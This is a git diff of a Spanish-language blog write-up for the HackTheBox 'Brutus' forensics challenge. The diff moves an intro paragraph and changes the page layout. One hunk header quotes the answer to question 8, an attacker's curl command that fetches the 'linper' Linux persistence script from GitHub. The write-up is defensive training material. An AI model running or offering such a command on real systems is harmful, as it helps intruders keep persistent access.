@@ -1,14 +1,14 @@
 ---
-layout: archive
+layout: single
 title: "Sherlocks - Brutus (HTB)"
 author_profile: true
 published: true
 ---
 
+Los sherlocks (De HackTheBox) son retos gamificados enfocados a __Blue Team__, en ellos, se encuentran distintas situaciones donde uno debe utilizar herramientas de analsis y artefactos para completar las tareas. Y claro, hay __categorías__ según lo que quieras entrenar, como por ejemplo _DFIR_ (Digital Forensics and Incident Response) que se enfocan en el __análsis de artefactos forenses__ (es decir, trazas de ataques en los sistemas).
+
 
 ![UTMP]({{ "/images/Brutus/logo.png" | relative_url }})
-
-Los sherlocks (De HackTheBox) son retos gamificados enfocados a __Blue Team__, en ellos, se encuentran distintas situaciones donde uno debe utilizar herramientas de analsis y artefactos para completar las tareas. Y claro, hay __categorías__ según lo que quieras entrenar, como por ejemplo _DFIR_ (Digital Forensics and Incident Response) que se enfocan en el __análsis de artefactos forenses__ (es decir, trazas de ataques en los sistemas).
 
 ## Resumen Brutus
 
@@ -154,3 +154,5 @@ Q8: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/li
 Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 
 
 En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.
+
+
